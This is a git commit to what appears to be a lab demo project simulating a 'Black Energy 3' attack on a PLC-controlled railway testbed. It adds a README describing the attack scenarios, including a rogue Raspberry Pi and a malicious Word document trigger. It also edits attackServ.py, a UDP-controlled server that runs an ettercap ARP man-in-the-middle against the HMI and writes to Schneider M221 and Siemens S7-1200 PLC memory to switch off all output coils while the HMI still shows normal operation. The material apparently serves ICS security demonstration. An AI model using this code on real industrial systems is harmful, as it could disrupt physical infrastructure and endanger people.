d8a5ab676d8a79fcca55f7b41ef51a5474ef4b09
LiuYuancheng <liu_yuan_cheng@hotmail.com>
2019-12-10 11:13:41 +0800

    Added the read me document.

--- attack/remoteAtk/README.md
+++ attack/remoteAtk/README.md
@@ -1,19 +1,47 @@
 # Remote Black Energy 3 Attack 
-##### This project will be used to demo the "black Energy 3" attack on the OT-PLC-Railway system.
+#### Introduction 
+
+This project will be used to demo the "Black Energy 3" attack on the OT-PLC-Railway system. When the attack happens all the PLC output coils will be turn off but the HMI center will show every thing normal.
+
+Attack implement steps: 
+
+1. Attack plug in the attack device in the OT-PLC-Railway system.(Raspberry PI which with the attack server program)
+
+2. Attack situation 1: Attacker use the remote attack control panel to turn off all the PLC output coils. 
+3. Attack situation 2: when the user open a MS word document, a update message box pop up, if the update confirm button was clicked, the attack server will turn off all the PLC output coils. 
+4. Attack situation 3: when the user click the "PLC detail menu" hyper-link in the word word document the attack start. 
 
 ------
 
-###### Function Tab Introduction
+#### Program Setup
 
-| The program provide 2 function tab to display system operation information and let user control/simulation different function |
-| ------------------------------------------------------------ |
-| Tab Idx0 System: Control the different components in the rail way system and 2 trains. |
-| Tab Idx1 PLC Control:  Show the PLC information and user can turn on/off PLC coils from this tab. |
-| Tab Idx2 Data Display: Show the PLC Memory /register status or overwrite PLC data. |
-| Tab Setting: Change the system setting and start different cyber attack simulation. |
+###### Development Evn: Python 2.7 & python 3.7
 
-Dev Env: python 2/ python3.7 
+###### Additional Lib/Software Need:
 
-File Dictionary: 
-Control Panel: 
-- a control UI use UDP to connect to the attack server to acitve or stop the attack. 
+1. snap7 + python-snap7 (need to install for S71200 PLC control) 
+
+   ```
+   Install instruction: 
+   http://simplyautomationized.blogspot.com/2014/12/raspberry-pi-getting-data-from-s7-1200.html
+   ```
+
+2. ettercap-graphical (need to install on Raspberry PI to do the attack)
+
+   ```
+   sudo apt-get update -y
+   sudo apt-get install -y ettercap-graphical
+   ```
+
+   
+
+###### Hardware Needed: 
+
+Raspberry PI Mode 3 B+ with ettercap installed and IP set: 
+
+```
+ifconfig eth0 192.168.10.244 netmask 255.255.255.0 up
+```
+
+
+
--- attack/remoteAtk/attackServ.py
+++ attack/remoteAtk/attackServ.py
@@ -17,12 +17,12 @@ import time
 import signal
 import socket
 import subprocess
-
+# PLC control module:
 import M2PLC221 as m221
 import S7PLC1200 as s71200
 
-SEV_IP = ('0.0.0.0', 5005)
-BUFFER_SZ = 1024
+SEV_IP = ('0.0.0.0', 5005)  # UDP server ip
+BUFFER_SZ = 1024            # UPD receive buffer size
 
 #-----------------------------------------------------------------------------
 #-----------------------------------------------------------------------------
@@ -33,57 +33,61 @@ class attackServ(object):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.sock.bind(SEV_IP)
         self.terminate = False
-        self.simulation = False
 
 #-----------------------------------------------------------------------------
     def changePLC(self):
-        """ Turn off all the PLC output.
-        """
-        print("Turning Off all the PLC coils. ")
+        """ Turn off all the PLC output, change area indicate LED to 'red'."""
+        print("Turning Off all the PLC coils: ")
         # Turn off M221 PLCs
-        memList = ('M0', 'M10', 'M20','M60')
+        memList = ('M0', 'M10', 'M20', 'M60')
+        # PLC 1 M221
         plc1 = m221.M221('192.168.10.72')
-        plc2 = m221.M221('192.168.10.71')
         for memAddr in memList:
             plc1.writeMem(memAddr, 0)
+            time.sleep(0.3)
+        plc1.writeMem('M60', 1)  # Turn the insudtrial LED to red.
+        plc1.disconnect()
+        print("Trun off PLC 1 output coils.")
+        # PLC 2 M221
+        plc2 = m221.M221('192.168.10.71')
+        for memAddr in memList:
             plc2.writeMem(memAddr, 0)
             time.sleep(0.3)
-        plc1.writeMem('M60', 1) # Turn the insudtrial LED to red.
-        plc2.writeMem('M60', 1) # Turn the city LED to red.
-        plc1.disconnect()
+        plc2.writeMem('M60', 1)  # Turn the city LED to red.
         plc2.disconnect()
-        # Trun off S72100 PLC
+        print("Trun off PLC 2 output coils.")
+        # PLC3 S72100
         plc3 = s71200.S7PLC1200('192.168.10.73')
         for x in range(4):
             plc3.writeMem('qx0.'+str(x), False)
             time.sleep(0.3)
-        plc3.writeMem('qx0.'+str(2), True) # Turn the residentail LED to red.
+        plc3.writeMem('qx0.'+str(2), True)  # Turn the residentail LED to red.
         plc3.plc.disconnect()
-        print("Finished turn off all the PLC output")
+        print("Trun off PLC 3 output coils.")
+        print("Finished turn off all the PLC output.")
 
 #-----------------------------------------------------------------------------
     def parseMsg(self, msg, addr):
         """ Parse the attack control message and do the attack."""
-        print("Receive msg: %s" %str(msg))
+        print("Received msg: %s" % str(msg))
         tag, val = msg.split(';')
         if tag == 'C':
             print('Client connected.')
-            msg = 'C;1' # send back the connected response.
+            msg = 'C;1'  # send back the connection confirm response.
             self.sock.sendto(msg.encode('utf-8'), addr)
         elif tag == 'A':
             if val == '1':
-                print('Starting the attack.')
+                print('Starting the attack:')
                 # Use subprocess to run the ettercap attack script.
                 atkStr = "sudo ettercap -T -q -F /home/pi/scada/demo/m221_3.ef -M ARP /192.168.10.21//"
                 print(str(subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)))
-                time.sleep(1)
+                time.sleep(1) # Sleep 1 sec to make sure the ettercap finished scanned the network,.
                 self.changePLC()
             else:
                 print('Stopping the attack.')
-                # Find the ettercap process and kill it.
+                # Find the ettercap process by ID and kill it.
                 for line in os.popen("ps ax | grep ettercap | grep -v grep"):
-                    fields = line.split()
-                    pid = fields[0]
+                    pid = line.split()[0]
                     os.kill(int(pid), signal.SIGKILL) # SIGKILL only in linux. 
 
 #-----------------------------------------------------------------------------
@@ -91,12 +95,11 @@ class attackServ(object):
         print('Server started.')
         while not self.terminate:
             data, address = self.sock.recvfrom(BUFFER_SZ)
-            if not data:
-                break
+            if not data: break
             if isinstance(data, bytes):
                 self.parseMsg(data.decode(encoding="utf-8"), address)
             else:
-                print('Data formate invalid: %s' % str(data))
+                print('Data format invalid: %s' % str(data))
 
 #-----------------------------------------------------------------------------
 #-----------------------------------------------------------------------------
